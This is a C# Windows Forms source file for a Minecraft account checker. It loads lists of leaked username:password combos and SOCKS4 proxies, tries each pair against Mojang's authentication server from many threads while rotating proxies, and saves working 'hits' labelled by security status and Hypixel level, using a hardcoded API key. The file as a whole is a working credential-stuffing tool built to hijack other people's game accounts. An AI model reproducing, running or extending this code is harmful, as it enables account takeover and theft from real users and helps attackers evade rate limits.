using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using xNet;

namespace WindowsFormsApp2
{
    public partial class Form1 : Form
    {
        //[DllImport("kernel32.dll", SetLastError = true)]
        //[return: MarshalAs(UnmanagedType.Bool)]
        //static extern bool AllocConsole();

        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            //AllocConsole();
        }

        private Object sync = new object();
        private int account_counter = 0;
        private int proxy_counter = 0;
        public List<string> hits = new List<string>();

        private int convert_to_level(double exp)
        {
            float REVERSE_PQ_PREFIX = -3.5f;
            float REVERSE_CONST = 12.25f;
            float GROWTH_DIVIDES_2 = 0.0008f;

            return (int)(exp < 0 ? 1 : Math.Floor(1 + REVERSE_PQ_PREFIX + Math.Sqrt(REVERSE_CONST + GROWTH_DIVIDES_2 * exp)));
        }

        private int get_hypixel_level(string username, string proxy)
        {
            using (var request = new HttpRequest())
            {
                request.UserAgent = Http.ChromeUserAgent();
                request.Cookies = new CookieDictionary(false);
                request.IgnoreProtocolErrors = true;
                if (proxy != string.Empty)
                    request.Proxy = Socks4ProxyClient.Parse(proxy);

                var response = string.Empty;

                string api_key = "6c70e600-3f93-4e18-ad18-7746aa476a9a";
                string request_url = "https://api.hypixel.net/player?key=" + api_key + "&name=" + username;

                try
                {
                    response = request.Get(request_url).ToString();
                }
                catch { }

                if (response.Contains("networkExp"))
                {
                    var json = Json.Deserialize(response);
                    return convert_to_level(Convert.ToDouble(json["player"]["networkExp"]));
                }

                return 0;
            }
        }

        private string check_minecraft(string[] login, string proxy)
        {
            using (var request = new HttpRequest())
            {
                request.UserAgent = Http.ChromeUserAgent();
                request.Cookies = new CookieDictionary(false);
                request.IgnoreProtocolErrors = true;
                if (proxy != string.Empty)
                    request.Proxy = Socks4ProxyClient.Parse(proxy);

                var response = string.Empty;

                try
                {
                    response = request.Post("https://authserver.mojang.com/authenticate", "{\"agent\": {\"name\":\"Minecraft\",\"version\":\"1\"},\"username\":\"" + login[0] + "\",\"password\":\"" + login[1] + "\",\"requestUser\":\"true\"}", "application/json").ToString();
                }
                catch { }

                if (!response.Contains("CloudFront") && !response.Contains("Invalid credentials") && response != string.Empty)
                {
                    var is_premium = response.Contains("selectedProfile");
                    if (is_premium)
                    {
                        var json_data = Json.Deserialize(response);

                        var hypixel_level = get_hypixel_level(Convert.ToString(json_data["selectedProfile"]["name"]), proxy);

                        var lvi = new ListViewItem();
                        lvi.Text = login[0];
                        lvi.SubItems.Add(login[1]);
                        lvi.SubItems.Add(Convert.ToString(json_data["selectedProfile"]["name"]));
                        lvi.SubItems.Add(Convert.ToString(json_data["user"]["secured"]));
                        lvi.SubItems.Add(Convert.ToString(hypixel_level));

                        listView1.Items.Add(lvi);
                        hitslabel.Text = (Convert.ToInt32(hitslabel.Text) + 1).ToString();

                        hits.Add(login[0] + ":" + login[1] + " | " + (Convert.ToBoolean(json_data["user"]["secured"]) ? "NFA" : "SFA") + " | " + json_data["selectedProfile"]["name"] + " | Hypixel Level: " + hypixel_level);
                    }
                    //else if (!checkBox1.Checked)
                    //{
                    //    var lvi = new ListViewItem();
                    //    lvi.Text = login[0];
                    //    lvi.SubItems.Add(login[1]);
                    //    lvi.SubItems.Add("-");
                    //    lvi.SubItems.Add("-");
                    //    lvi.SubItems.Add("-");
                    //    lvi.SubItems.Add("-");

                    //    listView1.Items.Add(lvi);
                    //    hitslabel.Text = (Convert.ToInt32(hitslabel.Text) + 1).ToString();

                    //    hits.Add(login[0] + ":" + login[1] + " | FREE");

                    //    Console.WriteLine(response);
                    //}
                }
                else if (response.Contains("CloudFront"))
                {
                    // account_counter--;
                }

                return response;
            }
        }

        private void check_accounts()
        {
            while (true)
            {
                if (is_stopping)
                    break;

                lock (sync)
                {
                    if (account_counter < combolist.Count() - 1)
                        account_counter++;
                    else
                        break;

                    if (proxy_counter < proxylist.Count() - 1)
                        proxy_counter++;
                    else
                        proxy_counter = 0;

                    checkedaccounts.Text = account_counter.ToString();
                    checkedproxies.Text = proxy_counter.ToString();
                }

                var login = combolist[account_counter].Replace(":", ";").Split(";".ToCharArray());
                var proxy = proxylist[proxy_counter];

                check_minecraft(login, proxy);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Directory.CreateDirectory("hits");

            is_stopping = false;
            account_counter = 0;
            if (proxylist == null)
            {
                MessageBox.Show("Load Proxy List", "Error");
                return;
            }

            if (combolist == null)
            {
                MessageBox.Show("Load Combo List", "Error");
                return;
            }

            List<Thread> thread_list = new List<Thread>();

            for (int i = 0; i < Convert.ToInt32(textBox1.Text); i++)
            {
                Thread thread = new Thread(check_accounts);
                thread.IsBackground = true;
                thread.Start();
            }
        }

        public string[] combolist;
        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog open_file_dialog1 = new OpenFileDialog();
            open_file_dialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            if (open_file_dialog1.ShowDialog() == DialogResult.OK)
            {
                combolist = System.IO.File.ReadAllLines(open_file_dialog1.FileName);
                comboslabel.Text = combolist.Count().ToString();
            }
        }

        public string[] proxylist;
        private void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog open_file_dialog2 = new OpenFileDialog();
            open_file_dialog2.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            if (open_file_dialog2.ShowDialog() == DialogResult.OK)
            {
                proxylist = System.IO.File.ReadAllLines(open_file_dialog2.FileName);
                proxieslabel.Text = proxylist.Count().ToString();
            }
        }

        public bool is_stopping = false;
        private void button4_Click(object sender, EventArgs e)
        {
            is_stopping = true;
        }

        private void savetofilebutton_Click(object sender, EventArgs e)
        {
            File.WriteAllLines("hits\\" + DateTime.Now.ToString("MM_dd_yyyy h_mm") + ".txt", hits);
        }
    }
}
